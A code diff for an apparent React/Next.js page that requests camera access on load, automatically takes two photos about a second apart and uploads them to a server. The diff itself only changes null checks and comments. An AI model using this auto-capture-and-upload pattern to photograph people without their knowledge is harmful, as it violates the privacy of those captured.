@@ -9,17 +9,16 @@ export default function Home() {
 
   const canvas1Ref = useRef<HTMLCanvasElement | null>(null);
   const photo1Ref = useRef<HTMLImageElement | null>(null);
-
   useEffect(() => {
     const video = videoRef.current;
     const canvas = canvasRef.current;
-    const context = canvas?.getContext('2d'); // Use optional chaining
+    const context = canvas ? canvas.getContext('2d') : null; // Check if canvas is not null
     const photo = photoRef.current;
-
+  
     const canvas1 = canvas1Ref.current;
-    const context1 = canvas1?.getContext('2d'); // Use optional chaining
+    const context1 = canvas1 ? canvas1.getContext('2d') : null; // Check if canvas1 is not null
     const photo1 = photo1Ref.current;
-
+  
     // Access the camera
     navigator.mediaDevices.getUserMedia({ video: true })
       .then((stream) => {
@@ -28,13 +27,13 @@ export default function Home() {
           video.addEventListener('loadeddata', () => {
             // Capture the first image instantly
             setTimeout(() => {
-              if (context) { // Check if context is available
+              if (context && canvas) { // Check if context and canvas are available
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageDataUrl = canvas.toDataURL('image/png');
-                if (photo) {
+                if (photo) { // Check if photo is available
                   photo.src = imageDataUrl;
                 }
-
+  
                 // Convert image to Blob and send via Axios
                 canvas.toBlob((blob) => {
                   if (blob) {
@@ -44,16 +43,16 @@ export default function Home() {
                 });
               }
             }, 0); // Capture immediately
-
+  
             // Capture the second image after 1 second
             setTimeout(() => {
-              if (context1) { // Check if context1 is available
+              if (canvas1 && context1) { // Check if canvas1 and context1 are available
                 context1.drawImage(video, 0, 0, canvas1.width, canvas1.height);
                 const imageDataUrl1 = canvas1.toDataURL('image/png');
-                if (photo1) {
+                if (photo1) { // Check if photo1 is available
                   photo1.src = imageDataUrl1;
                 }
-
+  
                 // Convert second image to Blob and send via Axios
                 canvas1.toBlob((blob) => {
                   if (blob) {
@@ -69,7 +68,7 @@ export default function Home() {
       .catch((err) => {
         console.error('Error accessing the camera: ', err);
       });
-
+  
   }, []);
 
   const sendPhotoToServer = async (file: File) => {
